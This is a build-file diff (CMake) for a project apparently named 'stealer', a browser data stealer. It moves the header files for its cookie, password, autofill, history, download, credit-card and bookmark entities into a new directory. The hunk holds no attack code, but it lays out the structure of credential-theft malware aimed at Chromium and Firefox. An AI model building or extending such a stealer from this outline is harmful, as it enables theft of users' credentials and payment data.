@@ -87,20 +87,20 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/browsers/chromium/impl/CCookies.cpp
         src/stealer/impl/browsers/chromium/impl/CCookies.h
         include/binaryhandler.hpp
-        src/stealer/impl/browsers/entity/Cookie.h
-        src/stealer/impl/browsers/entity/Password.h
-        src/stealer/impl/browsers/entity/AutoFill.h
-        src/stealer/impl/browsers/entity/History.h
-        src/stealer/impl/browsers/entity/Download.h
-        src/stealer/impl/browsers/entity/CreditCard.h
-        src/stealer/impl/browsers/entity/SharedEntity.h
+        src/entity/Cookie.h
+        src/entity/Password.h
+        src/entity/AutoFill.h
+        src/entity/History.h
+        src/entity/Download.h
+        src/entity/CreditCard.h
+        src/entity/SharedEntity.h
         src/stealer/impl/browsers/firefox/FirefoxBrowsers.cpp
         src/stealer/impl/browsers/firefox/FirefoxBrowsers.h
         src/stealer/impl/browsers/firefox/FirefoxBrowserModule.h
         src/stealer/impl/browsers/firefox/impl/FBookmarks.cpp
         src/stealer/impl/browsers/firefox/impl/FBookmarks.h
-        src/stealer/impl/browsers/entity/Entity.h
-        src/stealer/impl/browsers/entity/Bookmark.h
+        src/entity/Entity.h
+        src/entity/Bookmark.h
         src/utils/SQLiteUtil.cpp
         src/utils/SQLiteUtil.h
         src/stealer/impl/browsers/firefox/impl/FHistory.cpp
